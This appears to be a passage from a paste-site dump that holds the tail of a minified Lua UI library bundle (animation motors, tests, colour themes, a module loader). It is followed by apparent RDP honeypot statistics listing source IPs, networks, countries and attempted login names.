af=ae.new()spawn(function()af:fire(123,'hello')end)local ag,ai=af:wait()expect(ag).to.equal(123)expect(ai).to.equal'hello'end)it('should properly handle disconnections',function()local af,ag=ae.new(),false local ai=af:connect(function()ag=true end)ai:disconnect()af:fire()expect(ag).to.equal(false)end)end end)()end,[41]=function()local aa,ab,ac=a(41)local ad return(function(...)local ae=ac(ab.Parent.BaseMotor)local af=setmetatable({},ae)af.__index=af function af.new(ag,ai)assert(ag,'Missing argument #1: initialValue')assert(typeof(ag)=='number','initialValue must be a number!')local b=setmetatable(ae.new(),af)if ai~=nil then b._useImplicitConnections=ai else b._useImplicitConnections=true end b._goal=nil b._state={complete=true,value=ag}return b end function af.step(ag,ai)if ag._state.complete then return true end local b=ag._goal:step(ag._state,ai)ag._state=b ag._onStep:fire(b.value)if b.complete then if ag._useImplicitConnections then ag:stop()end ag._onComplete:fire()end return b.complete end function af.getValue(ag)return ag._state.value end function af.setGoal(ag,ai)ag._state.complete=false ag._goal=ai ag._onStart:fire()if ag._useImplicitConnections then ag:start()end end function af.__tostring(ag)return'Motor(Single)'end return af end)()end,[42]=function()local aa,ab,ac=a(42)local ad return(function(...)return function()local ae,af=ac(ab.Parent.SingleMotor),ac(ab.Parent.Instant)it('should assign new state on step',function()local ag=ae.new(0,false)ag:setGoal(af.new(5))ag:step(1.6666666666666665E-2)expect(ag._state.complete).to.equal(true)expect(ag._state.value).to.equal(5)end)it([[should invoke onComplete listeners when the goal is completed]],function()local ag,ai=ae.new(0,false),false ag:onComplete(function()ai=true end)ag:setGoal(af.new(5))ag:step(1.6666666666666665E-2)expect(ai).to.equal(true)end)it('should start when the goal is set',function()local ag,ai=ae.new(0,false),false ag:onStart(function()ai=not ai end)ag:setGoal(af.new(5))expect(ai).to.equal(true)ag:setGoal(af.new(5))expect(ai).to.equal(false)end)end end)()end,[43]=function()local aa,ab,ac=a(43)local ad return(function(...)local ae,af,ag,ai=0.001,0.001,0.0001,{}ai.__index=ai function ai.new(b,c)assert(b,'Missing argument #1: targetValue')c=c or{}return setmetatable({_targetValue=b,_frequency=c.frequency or 4,_dampingRatio=c.dampingRatio or 1},ai)end function ai.step(b,c,d)local e,g,h,i,j=b._dampingRatio,b._frequency*2*math.pi,b._targetValue,c.value,c.velocity or 0 local k,l,m,n=i-h,(math.exp(-e*g*d))if e==1 then m=(k*(1+g*d)+j*d)*l+h n=(j*(1-g*d)-k*(g*g*d))*l elseif e<1 then local o=math.sqrt(1-e*e)local r,s,t=math.cos(g*o*d),(math.sin(g*o*d))if o>ag then t=s/o else local u=d*g t=u+((u*u)*(o*o)*(o*o)/20-o*o)*(u*u*u)/6 end local u if g*o>ag then u=s/(g*o)else local v=g*o u=d+((d*d)*(v*v)*(v*v)/20-v*v)*(d*d*d)/6 end m=(k*(r+e*t)+j*u)*l+h n=(j*(r-t*e)-k*(t*g))*l else local o=math.sqrt(e*e-1)local r,s=-g*(e-o),-g*(e+o)local t=(j-k*r)/(2*g*o)local u=k-t local v,w=u*math.exp(r*d),t*math.exp(s*d)m=v+w+h n=v*r+w*s end local o=math.abs(n)<ae and math.abs(m-h)<af return{complete=o,value=o and h or m,velocity=n}end return ai end)()end,[44]=function()local aa,ab,ac=a(44)local ad return(function(...)return function()local ae,af=ac(ab.Parent.SingleMotor),ac(ab.Parent.Spring)describe('completed state',function()local ag,ai=ae.new(0,false),af.new(1,{frequency=2,dampingRatio=0.75})ag:setGoal(ai)for b=1,100 do ag:step(1.6666666666666665E-2)end it('should complete',function()expect(ag._state.complete).to.equal(true)end)it('should be exactly the goal value when completed',function()expect(ag._state.value).to.equal(1)end)end)it('should inherit velocity',function()local ag=ae.new(0,false)ag._state={complete=false,value=0,velocity=-5}local ai=af.new(1,{frequency=2,dampingRatio=1})ag:setGoal(ai)ag:step(1.6666666666666665E-2)expect(ag._state.velocity<0).to.equal(true)end)end end)()end,[45]=function()local aa,ab,ac=a(45)local ad return(function(...)local ae=function(ae)local af=tostring(ae):match'^Motor%((.+)%)$'if af then return true,af else return false end end return ae end)()end,[46]=function()local aa,ab,ac=a(46)local ad return(function(...)return function()local ae,af,ag=ac(ab.Parent.isMotor),ac(ab.Parent.SingleMotor),ac(ab.Parent.GroupMotor)local ai,b=af.new(0),ag.new{}it('should properly detect motors',function()expect(ae(ai)).to.equal(true)expect(ae(b)).to.equal(true)end)it(""shouldn't detect things that aren't motors"",function()expect(ae{}).to.equal(false)end)it('should return the proper motor type',function()local c,d=ae(ai)local e,g=ae(b)expect(d).to.equal'Single'expect(g).to.equal'Group'end)end end)()end,[47]=function()local aa,ab,ac=a(47)local ad return(function(...)local ae={Names={'Dark','Darker','Light','Aqua','Amethyst','Rose'}}for af,ag in next,ab:GetChildren()do local ai=ac(ag)ae[ai.Name]=ai end return ae end)()end,[48]=function()local aa,ab,ac=a(48)local ad return(function(...)return{Name='Amethyst',Accent=Color3.fromRGB(97,62,167),AcrylicMain=Color3.fromRGB(20,20,20),AcrylicBorder=Color3.fromRGB(110,90,130),AcrylicGradient=ColorSequence.new(Color3.fromRGB(85,57,139),Color3.fromRGB(40,25,65)),AcrylicNoise=0.92,TitleBarLine=Color3.fromRGB(95,75,110),Tab=Color3.fromRGB(160,140,180),Element=Color3.fromRGB(140,120,160),ElementBorder=Color3.fromRGB(60,50,70),InElementBorder=Color3.fromRGB(100,90,110),ElementTransparency=0.87,ToggleSlider=Color3.fromRGB(140,120,160),ToggleToggled=Color3.fromRGB(0,0,0),SliderRail=Color3.fromRGB(140,120,160),DropdownFrame=Color3.fromRGB(170,160,200),DropdownHolder=Color3.fromRGB(60,45,80),DropdownBorder=Color3.fromRGB(50,40,65),DropdownOption=Color3.fromRGB(140,120,160),Keybind=Color3.fromRGB(140,120,160),Input=Color3.fromRGB(140,120,160),InputFocused=Color3.fromRGB(20,10,30),InputIndicator=Color3.fromRGB(170,150,190),Dialog=Color3.fromRGB(60,45,80),DialogHolder=Color3.fromRGB(45,30,65),DialogHolderLine=Color3.fromRGB(40,25,60),DialogButton=Color3.fromRGB(60,45,80),DialogButtonBorder=Color3.fromRGB(95,80,110),DialogBorder=Color3.fromRGB(85,70,100),DialogInput=Color3.fromRGB(70,55,85),DialogInputLine=Color3.fromRGB(175,160,190),Text=Color3.fromRGB(240,240,240),SubText=Color3.fromRGB(170,170,170),Hover=Color3.fromRGB(140,120,160),HoverChange=0.04}end)()end,[49]=function()local aa,ab,ac=a(49)local ad return(function(...)return{Name='Aqua',Accent=Color3.fromRGB(60,165,165),AcrylicMain=Color3.fromRGB(20,20,20),AcrylicBorder=Color3.fromRGB(50,100,100),AcrylicGradient=ColorSequence.new(Color3.fromRGB(60,140,140),Color3.fromRGB(40,80,80)),AcrylicNoise=0.92,TitleBarLine=Color3.fromRGB(60,120,120),Tab=Color3.fromRGB(140,180,180),Element=Color3.fromRGB(110,160,160),ElementBorder=Color3.fromRGB(40,70,70),InElementBorder=Color3.fromRGB(80,110,110),ElementTransparency=0.84,ToggleSlider=Color3.fromRGB(110,160,160),ToggleToggled=Color3.fromRGB(0,0,0),SliderRail=Color3.fromRGB(110,160,160),DropdownFrame=Color3.fromRGB(160,200,200),DropdownHolder=Color3.fromRGB(40,80,80),DropdownBorder=Color3.fromRGB(40,65,65),DropdownOption=Color3.fromRGB(110,160,160),Keybind=Color3.fromRGB(110,160,160),Input=Color3.fromRGB(110,160,160),InputFocused=Color3.fromRGB(20,10,30),InputIndicator=Color3.fromRGB(130,170,170),Dialog=Color3.fromRGB(40,80,80),DialogHolder=Color3.fromRGB(30,60,60),DialogHolderLine=Color3.fromRGB(25,50,50),DialogButton=Color3.fromRGB(40,80,80),DialogButtonBorder=Color3.fromRGB(80,110,110),DialogBorder=Color3.fromRGB(50,100,100),DialogInput=Color3.fromRGB(45,90,90),DialogInputLine=Color3.fromRGB(130,170,170),Text=Color3.fromRGB(240,240,240),SubText=Color3.fromRGB(170,170,170),Hover=Color3.fromRGB(110,160,160),HoverChange=0.04}end)()end,[50]=function()local aa,ab,ac=a(50)local ad return(function(...)return{Name='Dark',Accent=Color3.fromRGB(96,205,255),AcrylicMain=Color3.fromRGB(60,60,60),AcrylicBorder=Color3.fromRGB(90,90,90),AcrylicGradient=ColorSequence.new(Color3.fromRGB(40,40,40),Color3.fromRGB(40,40,40)),AcrylicNoise=0.9,TitleBarLine=Color3.fromRGB(75,75,75),Tab=Color3.fromRGB(120,120,120),Element=Color3.fromRGB(120,120,120),ElementBorder=Color3.fromRGB(35,35,35),InElementBorder=Color3.fromRGB(90,90,90),ElementTransparency=0.87,ToggleSlider=Color3.fromRGB(120,120,120),ToggleToggled=Color3.fromRGB(0,0,0),SliderRail=Color3.fromRGB(120,120,120),DropdownFrame=Color3.fromRGB(160,160,160),DropdownHolder=Color3.fromRGB(45,45,45),DropdownBorder=Color3.fromRGB(35,35,35),DropdownOption=Color3.fromRGB(120,120,120),Keybind=Color3.fromRGB(120,120,120),Input=Color3.fromRGB(160,160,160),InputFocused=Color3.fromRGB(10,10,10),InputIndicator=Color3.fromRGB(150,150,150),Dialog=Color3.fromRGB(45,45,45),DialogHolder=Color3.fromRGB(35,35,35),DialogHolderLine=Color3.fromRGB(30,30,30),DialogButton=Color3.fromRGB(45,45,45),DialogButtonBorder=Color3.fromRGB(80,80,80),DialogBorder=Color3.fromRGB(70,70,70),DialogInput=Color3.fromRGB(55,55,55),DialogInputLine=Color3.fromRGB(160,160,160),Text=Color3.fromRGB(240,240,240),SubText=Color3.fromRGB(170,170,170),Hover=Color3.fromRGB(120,120,120),HoverChange=0.07}end)()end,[51]=function()local aa,ab,ac=a(51)local ad return(function(...)return{Name='Darker',Accent=Color3.fromRGB(72,138,182),AcrylicMain=Color3.fromRGB(30,30,30),AcrylicBorder=Color3.fromRGB(60,60,60),AcrylicGradient=ColorSequence.new(Color3.fromRGB(25,25,25),Color3.fromRGB(15,15,15)),AcrylicNoise=0.94,TitleBarLine=Color3.fromRGB(65,65,65),Tab=Color3.fromRGB(100,100,100),Element=Color3.fromRGB(70,70,70),ElementBorder=Color3.fromRGB(25,25,25),InElementBorder=Color3.fromRGB(55,55,55),ElementTransparency=0.82,DropdownFrame=Color3.fromRGB(120,120,120),DropdownHolder=Color3.fromRGB(35,35,35),DropdownBorder=Color3.fromRGB(25,25,25),Dialog=Color3.fromRGB(35,35,35),DialogHolder=Color3.fromRGB(25,25,25),DialogHolderLine=Color3.fromRGB(20,20,20),DialogButton=Color3.fromRGB(35,35,35),DialogButtonBorder=Color3.fromRGB(55,55,55),DialogBorder=Color3.fromRGB(50,50,50),DialogInput=Color3.fromRGB(45,45,45),DialogInputLine=Color3.fromRGB(120,120,120)}end)()end,[52]=function()local aa,ab,ac=a(52)local ad return(function(...)return{Name='Light',Accent=Color3.fromRGB(0,103,192),AcrylicMain=Color3.fromRGB(200,200,200),AcrylicBorder=Color3.fromRGB(120,120,120),AcrylicGradient=ColorSequence.new(Color3.fromRGB(255,255,255),Color3.fromRGB(255,255,255)),AcrylicNoise=0.96,TitleBarLine=Color3.fromRGB(160,160,160),Tab=Color3.fromRGB(90,90,90),Element=Color3.fromRGB(255,255,255),ElementBorder=Color3.fromRGB(180,180,180),InElementBorder=Color3.fromRGB(150,150,150),ElementTransparency=0.65,ToggleSlider=Color3.fromRGB(40,40,40),ToggleToggled=Color3.fromRGB(255,255,255),SliderRail=Color3.fromRGB(40,40,40),DropdownFrame=Color3.fromRGB(200,200,200),DropdownHolder=Color3.fromRGB(240,240,240),DropdownBorder=Color3.fromRGB(200,200,200),DropdownOption=Color3.fromRGB(150,150,150),Keybind=Color3.fromRGB(120,120,120),Input=Color3.fromRGB(200,200,200),InputFocused=Color3.fromRGB(100,100,100),InputIndicator=Color3.fromRGB(80,80,80),Dialog=Color3.fromRGB(255,255,255),DialogHolder=Color3.fromRGB(240,240,240),DialogHolderLine=Color3.fromRGB(228,228,228),DialogButton=Color3.fromRGB(255,255,255),DialogButtonBorder=Color3.fromRGB(190,190,190),DialogBorder=Color3.fromRGB(140,140,140),DialogInput=Color3.fromRGB(250,250,250),DialogInputLine=Color3.fromRGB(160,160,160),Text=Color3.fromRGB(0,0,0),SubText=Color3.fromRGB(40,40,40),Hover=Color3.fromRGB(50,50,50),HoverChange=0.16}end)()end,[53]=function()local aa,ab,ac=a(53)local ad return(function(...)return{Name='Rose',Accent=Color3.fromRGB(180,55,90),AcrylicMain=Color3.fromRGB(40,40,40),AcrylicBorder=Color3.fromRGB(130,90,110),AcrylicGradient=ColorSequence.new(Color3.fromRGB(190,60,135),Color3.fromRGB(165,50,70)),AcrylicNoise=0.92,TitleBarLine=Color3.fromRGB(140,85,105),Tab=Color3.fromRGB(180,140,160),Element=Color3.fromRGB(200,120,170),ElementBorder=Color3.fromRGB(110,70,85),InElementBorder=Color3.fromRGB(120,90,90),ElementTransparency=0.86,ToggleSlider=Color3.fromRGB(200,120,170),ToggleToggled=Color3.fromRGB(0,0,0),SliderRail=Color3.fromRGB(200,120,170),DropdownFrame=Color3.fromRGB(200,160,180),DropdownHolder=Color3.fromRGB(120,50,75),DropdownBorder=Color3.fromRGB(90,40,55),DropdownOption=Color3.fromRGB(200,120,170),Keybind=Color3.fromRGB(200,120,170),Input=Color3.fromRGB(200,120,170),InputFocused=Color3.fromRGB(20,10,30),InputIndicator=Color3.fromRGB(170,150,190),Dialog=Color3.fromRGB(120,50,75),DialogHolder=Color3.fromRGB(95,40,60),DialogHolderLine=Color3.fromRGB(90,35,55),DialogButton=Color3.fromRGB(120,50,75),DialogButtonBorder=Color3.fromRGB(155,90,115),DialogBorder=Color3.fromRGB(100,70,90),DialogInput=Color3.fromRGB(135,55,80),DialogInputLine=Color3.fromRGB(190,160,180),Text=Color3.fromRGB(240,240,240),SubText=Color3.fromRGB(170,170,170),Hover=Color3.fromRGB(200,120,170),HoverChange=0.04}end)()end},{{1,2,{'MainModule'},{{28,2,{'Icons'}},{2,2,{'Acrylic'},{{6,2,{'Utils'}},{5,2,{'CreateAcrylic'}},{4,2,{'AcrylicPaint'}},{3,2,{'AcrylicBlur'}}}},{18,2,{'Creator'}},{29,1,{'Packages'},{{30,2,{'Flipper'},{{35,2,{'Instant'}},{36,2,{'Instant.spec'}},{33,2,{'GroupMotor'}},{45,2,{'isMotor'}},{44,2,{'Spring.spec'}},{34,2,{'GroupMotor.spec'}},{31,2,{'BaseMotor'}},{40,2,{'Signal.spec'}},{37,2,{'Linear'}},{41,2,{'SingleMotor'}},{43,2,{'Spring'}},{32,2,{'BaseMotor.spec'}},{42,2,{'SingleMotor.spec'}},{39,2,{'Signal'}},{38,2,{'Linear.spec'}},{46,2,{'isMotor.spec'}}}}}},{19,2,{'Elements'},{{22,2,{'Dropdown'}},{27,2,{'Toggle'}},{20,2,{'Button'}},{24,2,{'Keybind'}},{26,2,{'Slider'}},{23,2,{'Input'}},{25,2,{'Paragraph'}},{21,2,{'Colorpicker'}}}},{7,1,{'Components'},{{11,2,{'Element'}},{10,2,{'Dialog'}},{8,2,{'Assets'}},{17,2,{'Window'}},{12,2,{'Notification'}},{14,2,{'Tab'}},{13,2,{'Section'}},{15,2,{'Textbox'}},{16,2,{'TitleBar'}},{9,2,{'Button'}}}},{47,2,{'Themes'},{{51,2,{'Darker'}},{53,2,{'Rose'}},{50,2,{'Dark'}},{49,2,{'Aqua'}},{52,2,{'Light'}},{48,2,{'Amethyst'}}}}}}},'0.4.1','WaxRuntime',string,task,setmetatable,error,next,table,unpack,coroutine,script,type,require,pcall,tostring,tonumber,_VERSION local r,s,t,u,v,w,x=d.insert,d.remove,d.freeze or function(r)return r end,g.wrap,ae.sub,ae.match,ae.gmatch if n and v(n,1,4)=='Lune'then local y,z=k(j,'@lune/task')if y and z then af=z end end local y=af and af.defer local z,A,B,C,D,E,F,G,H=y or function(z,...)u(z)(...)end,{[1]='Folder',[2]='ModuleScript',[3]='Script',[4]='LocalScript',[5]='StringValue'},{},{},{},{},{},{},{}local I,J={GetFullName={{},function(I)local J,K=I.Name,I.Parent while K do J=K.Name..'.'..J K=K.Parent end return J end},GetChildren={{},function(I)local J={}for K in b,H[I]do r(J,K)end return J end},GetDescendants={{},function(I)local J={}for K in b,H[I]do r(J,K)for L,M in b,K:GetDescendants()do r(J,M)end end return J end},FindFirstChild={{'string','boolean?'},function(I,J,K)local L=H[I]for M in b,L do if M.Name==J then return M end end if K then for N in b,L do return N:FindFirstChild(J,true)end end end},FindFirstAncestor={{'string'},function(I,J)local K=I.Parent while K do if K.Name==J then return K end K=K.Parent end end},WaitForChild={{'string','number?'},function(I,J)return I:FindFirstChild(J)end}},{}for K,L in b,I do local M,N,O=L[1],L[2],{}for P,Q in b,M do local R,S=w(Q,'^([^%?]+)(%??)')O[P]={R,S}end J[K]=function(R,...)if not H[R]then ai(""Expected ':' not '.' calling member function ""..K,2)end local S={...}for T,U in b,O do local V=S[T]local W,X,Y=i(V),U[1],U[2]if V==nil and not Y then ai('Argument '..V..' missing or nil',3)end if X~='any'and W~=X and not(W=='nil'and Y)then ai('Argument '..T..' expects type ""'..X..'"", got ""'..W..'""',2)end end return N(R,...)end end local M=function(M,N,O)local P,Q,R,S,T,U=ag({},{__mode='k'}),function(P)ai(P..' is not a valid (virtual) member of '..M..' ""'..N..'""',3)end,function(P)ai('Unable to assign (virtual) property '..P..'. Property is read only',3)end,{},{}T.__metatable=false T.__index=function(V,W)if W=='ClassName'then return M elseif W=='Name'then return N elseif W=='Parent'then return O elseif M=='StringValue'and W=='Value'then return U else local X=J[W]if X then return X end end for X in b,P do if X.Name==W then return X end end Q(W)end T.__newindex=function(V,W,X)if W=='ClassName'then R(W)elseif W=='Name'then N=X elseif W=='Parent'then if X==S then return end if O~=nil then H[O][S]=nil end O=X if X~=nil then H[X][S]=true end elseif M=='StringValue'and W=='Value'then U=X else Q(W)end end T.__tostring=function()return N end ag(S,T)H[S]=P if O~=nil then H[O][S]=true end return S end local function N(O,P)local Q,R,S,T=O[1],O[2],O[3],O[4]local U=A[R]local V=S and s(S,1)or U local W=M(U,V,P)B[Q]=W if S then for X,Y in b,S do W[X]=Y end end if T then for X,Y in b,T do N(Y,W)end end return W end local O=M('Folder','['..ad..']')for P,Q in b,ab do N(Q,O)end for R,S in b,aa do local T=B[R]C[T]=S D[T]=R local U=T.ClassName if U=='LocalScript'or U=='Script'then r(F,T)end end local aj=function(T)local U,V=T.ClassName,E[T]if V and U=='ModuleScript'then return e(V)end local aj,ak=C[T],function(W)W=l(W)local X,Y,Z=T:GetFullName(),w(W,'[^:]+:(%d+): (.+)')if not Y or not o then return X..':*: '..(Z or W)end Y=m(Y)local _=D[T]local aj=o[_]local ak=Y-aj+1 if ak<0 then ak='?'end return X..':'..ak..': '..Z end if U=='LocalScript'or U=='Script'then local W,X=k(aj)if not W then ai(ak(X),0)end else local W={k(aj)}local X=s(W,1)if not X then local Y=s(W,1)ai(ak(Y),0)end E[T]=W return e(W)end end function a(ak)local T,U,V=B[ak],function(T,...)local U={k(T,...)}local V=s(U,1)if not V then ai(U[1],3)end return e(U)end,t(ag({},{__index=G,__newindex=function(T,U,V)G[U]=V end,__len=function()return#G end,__iter=function()return b,G end}))local al,am,an=t{version=ac,envname=ad,shared=V,script=h,require=j},T,function(W,...)local X,Y,Z=i(W),'Attempted to call require with a non-ModuleScript','Attempted to call require with self'if X=='table'and H[W]then if W.ClassName~='ModuleScript'then ai(Y,2)elseif W==T then ai(Z,2)end return aj(W)elseif X=='string'and v(W,1,1)~='@'then if#W==0 then ai('Attempted to call require with empty string',2)end local _=T if v(W,1,1)=='/'then _=O elseif v(W,1,2)=='./'then W=v(W,3)end local al for am in x(W,'([^/]*)/?')do local an=am if am=='..'then an='Parent'end if an~=''then local ao=_:FindFirstChild(an)if not ao then local ap=_.Parent if ap then ao=ap:FindFirstChild(an)end end if ao then _=ao elseif am~=al and am~='init'and am~='init.server'and am~='init.client'then ai('Virtual script path ""'..W..'"" not found',2)end end al=am end if _.ClassName~='ModuleScript'then ai(Y,2)elseif _==T then ai(Z,2)end return aj(_)end return U(j,W,...)end return al,am,an end for ak,al in b,F do z(aj,al)end return aj(O:GetChildren()[1])"
qmvL3GPj,2024-04-23_stats.json,rdp_snitch,JSON,Tuesday 23rd of April 2024 07:18:10 PM CDT,"{
  ""ip"": {
    ""13.231.185.95"": 3,
    ""58.218.204.183"": 9,
    ""212.41.9.9"": 9,
    ""185.73.125.86"": 3,
    ""198.235.24.116"": 9,
    ""87.251.75.64"": 3,
    ""103.150.221.250"": 3,
    ""87.251.75.145"": 12,
    ""103.56.162.199"": 3,
    ""116.140.196.215"": 3,
    ""36.91.222.100"": 6,
    ""185.170.144.3"": 6,
    ""152.32.153.53"": 3,
    ""185.161.248.148"": 3,
    ""172.104.164.84"": 12,
    ""45.227.254.9"": 9,
    ""198.235.24.241"": 9,
    ""45.227.254.26"": 6,
    ""80.15.40.91"": 3,
    ""167.94.138.35"": 3,
    ""91.238.181.16"": 6,
    ""185.122.204.179"": 3,
    ""81.19.135.2"": 9,
    ""62.204.41.225"": 12,
    ""81.19.135.47"": 9,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""45.79.213.106"": 12,
    ""45.33.11.231"": 3,
    ""194.169.175.33"": 6,
    ""89.117.79.179"": 3,
    ""84.201.2.2"": 6,
    ""80.66.76.121"": 3,
    ""198.235.24.218"": 9,
    ""167.94.145.101"": 3,
    ""123.56.20.194"": 3,
    ""162.142.125.212"": 3,
    ""43.250.254.49"": 3,
    ""198.235.24.108"": 9,
    ""71.6.186.12"": 3
  },
  ""asn"": {
    ""AS16509"": 3,
    ""AS4134"": 9,
    ""AS49505"": 9,
    ""AS208091"": 21,
    ""AS396982"": 36,
    ""AS140599"": 3,
    ""AS135905"": 3,
    ""AS4837"": 3,
    ""AS7713"": 6,
    ""AS197414"": 6,
    ""AS135377"": 3,
    ""AS49202"": 3,
    ""AS63949"": 27,
    ""AS267784"": 15,
    ""AS3215"": 3,
    ""AS398324"": 6,
    ""AS49434"": 6,
    ""AS57523"": 3,
    ""AS209588"": 18,
    ""AS59425"": 12,
    ""AS208046"": 18,
    ""AS209605"": 6,
    ""AS40021"": 3,
    ""AS44066"": 6,
    ""AS398705"": 3,
    ""AS37963"": 3,
    ""AS133676"": 3,
    ""AS10439"": 3
  },
  ""isp"": {
    ""Amazon Technologies Inc."": 3,
    ""Chinanet"": 9,
    ""OOO \""Network of data-centers \""Selectel\"""": 9,
    ""Xhost Internet Solutions LP"": 27,
    ""Google LLC"": 36,
    ""Comfac Corporation"": 3,
    ""INETSOFT"": 3,
    ""China Unicom CHINA169 Network"": 3,
    ""PT Telekomunikasi Indonesia"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Kisara LLC"": 3,
    ""Akamai Technologies"": 12,
    ""Flyservers S.A."": 33,
    ""France Telecom Orange"": 3,
    ""Censys, Inc."": 9,
    ""Datacenter location PAR1 France"": 6,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Horizon LLC"": 12,
    ""ColocationX Ltd."": 18,
    ""Akamai Technologies, Inc."": 15,
    ""UAB Host Baltic"": 6,
    ""Nubes, LLC"": 3,
    ""www.accelerated.de"": 6,
    ""Hangzhou Alibaba Advertising Co"": 3,
    ""Precious netcom pvt ltd"": 3,
    ""CariNet, Inc."": 3
  },
  ""org"": {
    ""AWS EC2 (ap-northeast-1)"": 3,
    ""Chinanet JS"": 9,
    ""Unknown"": 12,
    ""Xhostis"": 9,
    ""Palo Alto Networks, Inc"": 36,
    ""Xhost Internet Solutions"": 18,
    ""Comfac Corporation"": 3,
    ""iNET software one member company limited"": 3,
    ""China United Network Communications Corporation Limited"": 3,
    ""Telekomunikasi Indonesia"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Kisara LLC"": 3,
    ""Linode"": 27,
    ""UAB Host Baltic"": 15,
    ""Censys, Inc"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Starcrecium Limited"": 3,
    ""Alviva Holding Limited"": 18,
    ""Horizon LLC"": 12,
    ""Makut Investments"": 9,
    ""ColocationX Ltd"": 9,
    ""EmanuelHosting LTD"": 6,
    ""Lrtc Inetnum Rent"": 3,
    ""diva-e Datacenters GmbH"": 6,
    ""Censys, Inc."": 3,
    ""Aliyun Computing Co., LTD"": 3,
    ""Censys Inc"": 3,
    ""Gstech Software Systems Pvt Ltd"": 3,
    ""sysadmin@cari.net"": 3
  },
  ""regionName"": {
    ""Tokyo"": 3,
    ""Jiangsu"": 9,
    ""Moscow"": 27,
    ""North Holland"": 36,
    ""California"": 39,
    ""Davao Region"": 3,
    ""Ho Chi Minh"": 3,
    ""Beijing"": 6,
    ""Jakarta"": 9,
    ""North West"": 12,
    ""Vilnius"": 15,
    ""\u00cele-de-France"": 9,
    ""Michigan"": 6,
    ""Hesse"": 27,
    ""Virginia"": 9,
    ""Georgia"": 12,
    ""Texas"": 3,
    ""Kaunas"": 6,
    ""New York"": 3,
    ""Uttarakhand"": 3
  },
  ""country"": {
    ""Japan"": 3,
    ""China"": 15,
    ""Russia"": 27,
    ""The Netherlands"": 36,
    ""United States"": 72,
    ""Philippines"": 3,
    ""Vietnam"": 3,
    ""Indonesia"": 9,
    ""Singapore"": 12,
    ""Lithuania"": 21,
    ""France"": 9,
    ""Germany"": 27,
    ""India"": 3
  },
  ""account"": {
    ""hello"": 42,
    ""Domain"": 66,
    ""(empty)"": 15,
    ""YglHRmXnr"": 3,
    ""emesqa"": 3,
    ""JbyoCL"": 3,
    ""Administr"": 36,
    ""Test"": 27,
    ""Administrator"": 3,
    ""lLUrRQUJU"": 3,
    ""EfeZGZ"": 3,
    ""VJeNaY"": 3,
    ""iumv56u0"": 12,
    ""beio"": 3,
    ""SyaalRjfk"": 3,
    ""TWFzre"": 3,
    ""aRRDVl"": 3,
    ""jMGmoNEuv"": 3,
    ""VynFgN"": 3,
    ""splrUt"": 3
  },
  ""keyboard"": {
    ""Unknown"": 240
  },
  ""client_build"": {
    ""Unknown"": 240
  },
  ""client_name"": {
    ""Unknown"": 240
  },
  ""ip_type"": {
    ""hosting"": 96,
    ""proxy"": 12,
    ""Unknown"": 123,
    ""mobile"": 9
  }
}"
NQSvtB3K,2024-04-23_stats.json,rdp_snitch,JSON,Tuesday 23rd of April 2024 07:16:13 PM CDT,"{
  ""ip"": {
    ""13.231.185.95"": 2,
    ""58.218.204.183"": 6,
    ""212.41.9.9"": 6,
    ""185.73.125.86"": 2,
    ""198.235.24.116"": 6,
    ""87.251.75.64"": 2,
    ""103.150.221.250"": 2,
    ""87.251.75.145"": 8,
    ""103.56.162.199"": 2,
    ""116.140.196.215"": 2,
    ""36.91.222.100"": 4,
    ""185.170.144.3"": 4,
    ""152.32.153.53"": 2,
    ""185.161.248.148"": 2,
    ""172.104.164.84"": 8,
    ""45.227.254.9"": 6,
    ""198.235.24.241"": 6,
    ""45.227.254.26"": 4,
    ""80.15.40.91"": 2,
    ""167.94.138.35"": 2,
    ""91.238.181.16"": 4,
    ""185.122.204.179"": 2,
    ""81.19.135.2"": 6,
    ""62.204.41.225"": 8,
    ""81.19.135.47"": 6,
    ""185.196.220.41"": 6,
    ""193.142.146.227"": 6,
    ""45.79.213.106"": 8,
    ""45.33.11.231"": 2,
    ""194.169.175.33"": 4,
    ""89.117.79.179"": 2,
    ""84.201.2.2"": 4,
    ""80.66.76.121"": 2,
    ""198.235.24.218"": 6,
    ""167.94.145.101"": 2,
    ""123.56.20.194"": 2,
    ""162.142.125.212"": 2,
    ""43.250.254.49"": 2,
    ""198.235.24.108"": 6,
    ""71.6.186.12"": 2
  },
  ""asn"": {
    ""AS16509"": 2,
    ""AS4134"": 6,
    ""AS49505"": 6,
    ""AS208091"": 14,
    ""AS396982"": 24,
    ""AS140599"": 2,
    ""AS135905"": 2,
    ""AS4837"": 2,
    ""AS7713"": 4,
    ""AS197414"": 4,
    ""AS135377"": 2,
    ""AS49202"": 2,
    ""AS63949"": 18,
    ""AS267784"": 10,
    ""AS3215"": 2,
    ""AS398324"": 4,
    ""AS49434"": 4,
    ""AS57523"": 2,
    ""AS209588"": 12,
    ""AS59425"": 8,
    ""AS208046"": 12,
    ""AS209605"": 4,
    ""AS40021"": 2,
    ""AS44066"": 4,
    ""AS398705"": 2,
    ""AS37963"": 2,
    ""AS133676"": 2,
    ""AS10439"": 2
  },
  ""isp"": {
    ""Amazon Technologies Inc."": 2,
    ""Chinanet"": 6,
    ""OOO \""Network of data-centers \""Selectel\"""": 6,
    ""Xhost Internet Solutions LP"": 18,
    ""Google LLC"": 24,
    ""Comfac Corporation"": 2,
    ""INETSOFT"": 2,
    ""China Unicom CHINA169 Network"": 2,
    ""PT Telekomunikasi Indonesia"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Kisara LLC"": 2,
    ""Akamai Technologies"": 8,
    ""Flyservers S.A."": 22,
    ""France Telecom Orange"": 2,
    ""Censys, Inc."": 6,
    ""Datacenter location PAR1 France"": 4,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Horizon LLC"": 8,
    ""ColocationX Ltd."": 12,
    ""Akamai Technologies, Inc."": 10,
    ""UAB Host Baltic"": 4,
    ""Nubes, LLC"": 2,
    ""www.accelerated.de"": 4,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""Precious netcom pvt ltd"": 2,
    ""CariNet, Inc."": 2
  },
  ""org"": {
    ""AWS EC2 (ap-northeast-1)"": 2,
    ""Chinanet JS"": 6,
    ""Unknown"": 8,
    ""Xhostis"": 6,
    ""Palo Alto Networks, Inc"": 24,
    ""Xhost Internet Solutions"": 12,
    ""Comfac Corporation"": 2,
    ""iNET software one member company limited"": 2,
